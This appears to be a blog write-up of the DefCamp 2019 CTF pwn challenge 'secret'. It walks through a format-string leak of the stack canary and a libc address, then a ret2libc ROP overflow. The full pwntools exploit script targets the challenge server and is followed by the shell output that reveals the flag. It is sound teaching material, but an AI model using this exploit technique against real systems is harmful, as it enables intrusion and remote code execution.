I"k<p>This binary had a format string vulnerability + a stack buffer overflow vulnerability. We use the format string vulnerability to leak the stack canary and a libc address from the stack. Calculate libc base address then find the address of <code class="highlighter-rouge">system</code> and a <code class="highlighter-rouge">/bin/sh</code> string, then call <code class="highlighter-rouge">system("/bin/sh")</code> to get a shell.</p>

<h3 id="challenge">Challenge</h3>

<ul>
  <li><strong>Category:</strong> pwn</li>
  <li><strong>Points:</strong> 162</li>
  <li><strong>Solves:</strong> 55</li>
</ul>

<blockquote>
  <p>Target: 206.81.24.129:1339</p>

  <p>Download <a href="https://drive.google.com/file/d/1Y0LdAk3K0NPIzFGsIOhNlOBwfIn-BTLK/view?usp=sharing">binary</a></p>

  <p>Author: Andrei</p>
</blockquote>

<h3 id="solution">Solution</h3>

<p>This challenge is practically identical to Not So Easy Bof from HackCon 2019. You can find my writeup for that challenge <a href="/pwn/2019/08/23/hackcon-not-so-easy-b0f.html">here</a>. I’ll skip a lot of the in depth stuff. The binary has all protections enabled except Full RELRO.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwn-and-rev/defcamp-2019/pwn/secret<span class="nv">$ </span>checksec secret
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-rev/defcamp-2019/pwn/secret/secret'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre></div></div>

<p>To start off with, I open the binary in IDA to disassemble it. In this case the binary is simple enough to just use the decompiler, but you should realize that I usually only use the decompiler as a guide to see what I should really take a look at, and then use the actual disassembly to understand it.</p>

<p>The main function is as follows:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">1</span><span class="p">.</span> <span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 <span class="mi">2</span><span class="p">.</span> <span class="p">{</span>
 <span class="mi">3</span><span class="p">.</span> 	<span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-50h]</span>
 <span class="mi">4</span><span class="p">.</span>   <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+48h] [rbp-8h]</span>
 <span class="mi">5</span><span class="p">.</span>
 <span class="mi">6</span><span class="p">.</span>   <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
 <span class="mi">7</span><span class="p">.</span>   <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
 <span class="mi">8</span><span class="p">.</span>   <span class="n">setvbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
 <span class="mi">9</span><span class="p">.</span>   <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x40uLL</span><span class="p">);</span>
<span class="mi">10</span><span class="p">.</span>   <span class="n">printf</span><span class="p">(</span><span class="s">"Enter your name?</span><span class="se">\n</span><span class="s">Name: "</span><span class="p">);</span>
<span class="mi">11</span><span class="p">.</span>   <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x40uLL</span><span class="p">);</span>
<span class="mi">12</span><span class="p">.</span>   <span class="n">printf</span><span class="p">(</span><span class="s">"Hillo "</span><span class="p">);</span>
<span class="mi">13</span><span class="p">.</span>   <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span> <span class="c1">// FORMAT STRING VULNERABILITY HERE</span>
<span class="mi">14</span><span class="p">.</span>   <span class="n">secret</span><span class="p">();</span>
<span class="mi">15</span><span class="p">.</span>   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="mi">16</span><span class="p">.</span> <span class="p">}</span>
</code></pre></div></div>

<p>We see a format string vulnerability at line 13, as well as a call to <code class="highlighter-rouge">secret()</code>. The secret function does the following:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">1</span><span class="p">.</span> <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">secret</span><span class="p">()</span>
 <span class="mi">2</span><span class="p">.</span> <span class="p">{</span>
 <span class="mi">3</span><span class="p">.</span>   <span class="kt">char</span> <span class="n">s1</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-90h]</span>
 <span class="mi">4</span><span class="p">.</span>   <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+88h] [rbp-8h]</span>
 <span class="mi">5</span><span class="p">.</span>
 <span class="mi">6</span><span class="p">.</span>   <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
 <span class="mi">7</span><span class="p">.</span>   <span class="n">printf</span><span class="p">(</span><span class="s">"Enter secret phrase !</span><span class="se">\n</span><span class="s">Phrase: "</span><span class="p">);</span>
 <span class="mi">8</span><span class="p">.</span>   <span class="n">gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s1</span><span class="p">);</span> <span class="c1">// BUFFER OVERFLOW VULNERABILITY HERE</span>
 <span class="mi">9</span><span class="p">.</span>   <span class="n">printf</span><span class="p">(</span><span class="s">"Entered secret &gt; %s .</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s1</span><span class="p">);</span>
<span class="mi">10</span><span class="p">.</span>   <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s1</span><span class="p">,</span> <span class="s">"supersecretdctf2019"</span><span class="p">)</span> <span class="p">)</span>
<span class="mi">11</span><span class="p">.</span>     <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">You entered the same string two times"</span><span class="p">);</span>
<span class="mi">12</span><span class="p">.</span>   <span class="k">else</span>
<span class="mi">13</span><span class="p">.</span>     <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Entered strings are not same!"</span><span class="p">);</span>
<span class="mi">14</span><span class="p">.</span>   <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v2</span><span class="p">;</span>
<span class="mi">15</span><span class="p">.</span> <span class="p">}</span>
</code></pre></div></div>

<p>Here we see a buffer overflow vulnerability at line 8.</p>

<p>The key takeaway is that stack canaries are enabled, so in order to exploit this, my plan is the following:</p>

<ol>
  <li>Use the format string vulnerability to leak the stack canary from the stack as well as a libc address from the stack</li>
  <li>Use the buffer overflow vulnerability to hijack program execution and jump to a one gadget in libc</li>
</ol>

<p>Now before we begin, the challenge didn’t provide a libc file, so I first just leaked a couple addresses off the stack on the remote server using the following script:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./secret'</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">26</span><span class="p">):</span>
	<span class="c1">#p = process(BINARY)
</span>	<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'206.81.24.129'</span><span class="p">,</span> <span class="mi">1339</span><span class="p">)</span>
	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'AAAAAAAA </span><span class="si">%</span><span class="s">{}$lx'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
	<span class="k">print</span> <span class="s">'</span><span class="si">%02</span><span class="s">d: '</span><span class="o">%</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
	<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">print</span> <span class="s">''</span>
</code></pre></div></div>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vagrant</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">-</span><span class="n">bionic</span><span class="o">:/</span><span class="n">ctf</span><span class="o">/</span><span class="n">pwn</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">rev</span><span class="o">/</span><span class="n">defcamp</span><span class="o">-</span><span class="mi">2019</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">secret</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">leak</span><span class="p">.</span><span class="n">py</span>
<span class="mo">01</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">7</span><span class="n">ffd17473a40</span>
<span class="mo">02</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">7</span><span class="n">f0489d77780</span>
<span class="mo">03</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">7</span><span class="n">fb1ac3332c0</span>
<span class="mo">04</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">7</span><span class="n">fc48cc0c700</span>
<span class="mo">05</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">6</span>
<span class="mo">06</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">4141414141414141</span>
<span class="mo">07</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="n">a786c24372520</span>
<span class="mi">08</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">0</span>
<span class="mi">09</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">0</span>
<span class="mi">10</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">0</span>
<span class="mi">11</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">0</span>
<span class="mi">12</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">0</span>
<span class="mi">13</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">0</span>
<span class="mi">14</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">7</span><span class="n">ffc69e731c0</span>
<span class="mi">15</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">50</span><span class="n">c8a62af6681400</span>
<span class="mi">16</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mf">55844e558</span><span class="n">c40</span>
<span class="mi">17</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">7</span><span class="n">f9da5e8c830</span>
<span class="mi">18</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">0</span>
<span class="mi">19</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">7</span><span class="n">ffe154e1b08</span>
<span class="mi">20</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">100000000</span>
<span class="mi">21</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">55</span><span class="n">d0bb425b6d</span>
<span class="mi">22</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">0</span>
<span class="mi">23</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">1</span><span class="n">b80133a664fcb03</span>
<span class="mi">24</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">55</span><span class="n">abfbcb8960</span>
<span class="mi">25</span><span class="o">:</span> <span class="n">Hillo</span> <span class="n">AAAAAAAA</span> <span class="mi">7</span><span class="n">ffd7da3f850</span>
</code></pre></div></div>

<p>Now using gdb on my local machine, I know that the address at offset 2 is the libc address of <code class="highlighter-rouge">_IO_stdfile_1_lock_</code>, while the value at offset 15 is the stack canary.</p>

<p>Now the libc address at offset 2 changed constantly, but the last 12 bits were always <code class="highlighter-rouge">0x780</code>. I ran the local binary on multiple VMs with different libc versions, and found that the remote binary is using <code class="highlighter-rouge">libc-2.23</code> as that was the only one where the address at offset 2 ended with <code class="highlighter-rouge">0x780</code>. Now knowing this, I used gdb with an Ubuntu Xenial VM (which comes with <code class="highlighter-rouge">libc-2.23</code>) to find that the address at offset 2 is always <code class="highlighter-rouge">libc_base_address + 0x3c6780</code>.</p>

<p>I also found out using gdb that the number of bytes I have to type in before reaching the stack canary in the <code class="highlighter-rouge">secret()</code> function is 136 bytes.</p>

<p>For more information about how exactly I do all of the above, please check out <a href="/pwn/2019/08/23/hackcon-not-so-easy-b0f.html">my writeup for Not So Easy Bof from HackCon 2019</a> which is basically the same challenge. My writeup for that challenge goes more in depth about the steps taken.</p>

<p>Next, I just leak the stack canary at offset 15 and the libc address at offset 2. I then calculate the libc base address, and since none of the one shot gadgets were working, I find the addresses of <code class="highlighter-rouge">system()</code> and the <code class="highlighter-rouge">/bin/sh</code> string. I then create the buffer overflow payload knowing that it will be <code class="highlighter-rouge">136bytes + 8byte_stack_canary + 8byte_saved_ebp + return_address</code>.</p>

<p>The following script will do the job:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'206.81.24.129'</span><span class="p">,</span> <span class="mi">1339</span>
<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./secret'</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.23.so'</span><span class="p">)</span> <span class="c1"># libc.so.6 from Ubuntu Xenial
</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># canary offset is 136 bytes, index 15
# libc offset 0x3c6780 for address index 2
</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'0x</span><span class="si">%2</span><span class="s">$lx-0x</span><span class="si">%15</span><span class="s">$lx'</span><span class="p">)</span> <span class="c1"># Leak libc address (idx 2) and the canary (idx 15)
</span><span class="n">leaks</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'-'</span><span class="p">)</span>

<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x3c6780</span>
<span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">one_gadget</span> <span class="o">=</span> <span class="mh">0xf1147</span> <span class="c1"># 0x45216, 0x4526a, 0xf02a4 &lt;- none of the gadgets worked
</span><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span><span class="o">.</span><span class="nb">next</span><span class="p">()</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x21102</span> <span class="c1"># found using ROPgadget on libc-2.23.so
</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'canary: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'/bin/sh: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'pop rdi: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">136</span> <span class="c1"># Write upto canary
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="c1"># Write the canary so we can smash the stack without it complaining
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">'B'</span><span class="o">*</span><span class="mi">8</span> <span class="c1"># Overwrite ebp
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="c1"># Jump to pop rdi gadget
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="c1"># Put address of '/bin/sh' string into rdi
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="c1"># call system("/bin/sh")
</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwn-and-rev/defcamp-2019/pwn/secret<span class="nv">$ </span>./exploit.py REMOTE
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-rev/defcamp-2019/pwn/secret/secret'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-rev/defcamp-2019/pwn/secret/libc-2.23.so'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span>+] Opening connection to 206.81.24.129 on port 1339: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> libc base: 0x7f4154a32000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> canary: 0x7d10bab19e1eaf00
<span class="o">[</span><span class="k">*</span><span class="o">]</span> system: 0x7f4154a77390
<span class="o">[</span><span class="k">*</span><span class="o">]</span> /bin/sh: 0x7f4154bbed57
<span class="o">[</span><span class="k">*</span><span class="o">]</span> pop rdi: 0x7f4154a53102
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
Entered secret <span class="o">&gt;</span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA <span class="nb">.</span>

Entered strings are not same!
<span class="nv">$ </span><span class="nb">ls
</span>flag
pwn
readme
<span class="nv">$ </span><span class="nb">cat </span>flag
DCTF<span class="o">{</span>17AF6D77BFDAC4CAF6CD2FD2F3EB85FB654D2E36745F926169C0958333496979<span class="o">}</span><span class="err">$</span>
</code></pre></div></div>

<p>Flag: <code class="highlighter-rouge">DCTF{17AF6D77BFDAC4CAF6CD2FD2F3EB85FB654D2E36745F926169C0958333496979}</code></p>
:ET